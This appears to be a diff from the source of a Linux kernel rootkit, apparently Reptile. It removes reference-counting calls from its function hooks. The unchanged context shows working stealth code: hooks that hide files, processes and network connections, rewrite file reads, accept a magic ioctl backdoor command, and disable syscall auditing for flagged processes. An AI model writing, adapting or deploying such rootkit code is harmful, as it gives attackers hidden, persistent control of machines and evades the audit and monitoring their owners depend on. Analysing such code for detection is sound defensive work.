@@ -621,10 +621,8 @@ static int khook_fillonedir(void *__buf, const char *name, int namlen,
 			    loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	KHOOK_GET(fillonedir);
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
-	KHOOK_PUT(fillonedir);
 	return ret;
 }
 
@@ -633,10 +631,8 @@ static int khook_filldir(void *__buf, const char *name, int namlen,
 			 loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	KHOOK_GET(filldir);
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
-	KHOOK_PUT(filldir);
 	return ret;
 }
 
@@ -645,10 +641,8 @@ static int khook_filldir64(void *__buf, const char *name, int namlen,
 			   loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	KHOOK_GET(filldir64);
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
-	KHOOK_PUT(filldir64);
 	return ret;
 }
 
@@ -657,10 +651,8 @@ static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
 				   loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	KHOOK_GET(compat_fillonedir);
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
-	KHOOK_PUT(compat_fillonedir);
 	return ret;
 }
 
@@ -669,10 +661,8 @@ static int khook_compat_filldir(void *__buf, const char *name, int namlen,
 				loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	KHOOK_GET(compat_filldir);
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
-	KHOOK_PUT(compat_filldir);
 	return ret;
 }
 
@@ -682,10 +672,8 @@ static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
 				  loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	KHOOK_GET(compat_filldir64);
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
-	KHOOK_PUT(compat_filldir64);
 	return ret;
 }
 #endif
@@ -699,17 +687,14 @@ struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
 #endif
 {
 	struct dentry *found = NULL;
-	KHOOK_GET(__d_lookup);
 	if (!strstr(name->name, HIDE) || !hidden)
 		found = KHOOK_ORIGIN(__d_lookup, parent, name);
-	KHOOK_PUT(__d_lookup);
 	return found;
 }
 
 KHOOK_EXT(struct tgid_iter, next_tgid, struct pid_namespace *, struct tgid_iter);
 static struct tgid_iter khook_next_tgid(struct pid_namespace *ns, struct tgid_iter iter)
 {
-	KHOOK_GET(next_tgid);
 	if (hidden) {
 		while ((iter = KHOOK_ORIGIN(next_tgid, ns, iter), iter.task) != NULL) {
 			if (!(iter.task->flags & FLAG))
@@ -720,8 +705,6 @@ static struct tgid_iter khook_next_tgid(struct pid_namespace *ns, struct tgid_it
 	} else {
 		iter = KHOOK_ORIGIN(next_tgid, ns, iter);
 	}
-
-	KHOOK_PUT(next_tgid);
 	return iter;
 }
 
@@ -731,7 +714,6 @@ static ssize_t khook_vfs_read(struct file *file, char __user *buf,
 {
 	ssize_t ret;
 
-	KHOOK_GET(vfs_read);
 	ret = KHOOK_ORIGIN(vfs_read, file, buf, count, pos);
 
 	if (file_tampering) {
@@ -739,7 +721,6 @@ static ssize_t khook_vfs_read(struct file *file, char __user *buf,
 			ret = hide_content(buf, ret);
 	}
 
-	KHOOK_PUT(vfs_read);
 	return ret;
 }
 
@@ -753,7 +734,6 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 	struct sockaddr_in addr;
 	struct hidden_conn *hc;
 
-	KHOOK_GET(inet_ioctl);
 	if (cmd == AUTH && arg == HTUA) {
 		if (control_flag) {
 			control_flag = 0;
@@ -876,7 +856,6 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 origin:
 	ret = KHOOK_ORIGIN(inet_ioctl, sock, cmd, arg);
 out:
-	KHOOK_PUT(inet_ioctl);
 	return ret;
 }
 
@@ -889,8 +868,6 @@ static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
 	struct hidden_conn *hc;
 	unsigned short dport;
 	unsigned int daddr;
-
-	KHOOK_GET(tcp4_seq_show);
 
 	if (v == SEQ_START_TOKEN) {
 		goto origin;
@@ -917,7 +894,6 @@ static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
 origin:
 	ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
 out:
-	KHOOK_PUT(tcp4_seq_show);
 	return ret;
 }
 
@@ -930,8 +906,6 @@ static int khook_udp4_seq_show(struct seq_file *seq, void *v)
 	struct hidden_conn *hc;
 	unsigned short dport;
 	unsigned int daddr;
-
-	KHOOK_GET(udp4_seq_show);
 
 	if (v == SEQ_START_TOKEN) {
 		goto origin;
@@ -958,7 +932,6 @@ static int khook_udp4_seq_show(struct seq_file *seq, void *v)
 origin:
 	ret = KHOOK_ORIGIN(udp4_seq_show, seq, v);
 out:
-	KHOOK_PUT(udp4_seq_show);
 	return ret;
 }
 
@@ -967,12 +940,9 @@ static int khook_load_elf_binary(struct linux_binprm *bprm)
 {
 	int ret = 0;
 
-	KHOOK_GET(load_elf_binary);
 	ret = KHOOK_ORIGIN(load_elf_binary, bprm);
 	if (!ret && !strcmp(bprm->filename, SHELL))
 		flag_tasks(current->pid, 1);
-
-	KHOOK_PUT(load_elf_binary);
 
 	return ret;
 }
@@ -982,12 +952,9 @@ static int khook_copy_creds(struct task_struct *p, unsigned long clone_flags)
 {
 	int ret = 0;
 
-	KHOOK_GET(copy_creds);
 	ret = KHOOK_ORIGIN(copy_creds, p, clone_flags);
 	if (!ret && current->flags & FLAG)
 		p->flags |= FLAG;
-
-	KHOOK_PUT(copy_creds);
 
 	return ret;
 }
@@ -995,12 +962,9 @@ static int khook_copy_creds(struct task_struct *p, unsigned long clone_flags)
 KHOOK(exit_creds);
 static void khook_exit_creds(struct task_struct *p)
 {
-	KHOOK_GET(exit_creds);
 	KHOOK_ORIGIN(exit_creds, p);
 	if (p->flags & FLAG)
 		p->flags &= ~FLAG;
-
-	KHOOK_PUT(exit_creds);
 }
 
 KHOOK(audit_alloc);
@@ -1008,13 +972,11 @@ static int khook_audit_alloc(struct task_struct *t)
 {
 	int err = 0;
 
-	KHOOK_GET(audit_alloc);
 	if (t->flags & FLAG) {
 		clear_tsk_thread_flag(t, TIF_SYSCALL_AUDIT);
 	} else {
 		err = KHOOK_ORIGIN(audit_alloc, t);
 	}
-	KHOOK_PUT(audit_alloc);
 	return err;
 }
 
@@ -1023,12 +985,10 @@ struct task_struct *khook_find_task_by_vpid(pid_t vnr)
 {
 	struct task_struct *tsk = NULL;
 
-	KHOOK_GET(find_task_by_vpid);
 	tsk = KHOOK_ORIGIN(find_task_by_vpid, vnr);
 	if (tsk && (tsk->flags & FLAG) && !(current->flags & FLAG))
 		tsk = NULL;
 
-	KHOOK_PUT(find_task_by_vpid);
 	return tsk;
 }
 
@@ -1057,7 +1017,6 @@ static int __init reptile_init(void)
 	
 	exec(argv);
 	hide();
-
 out:
 	return ret;
 }
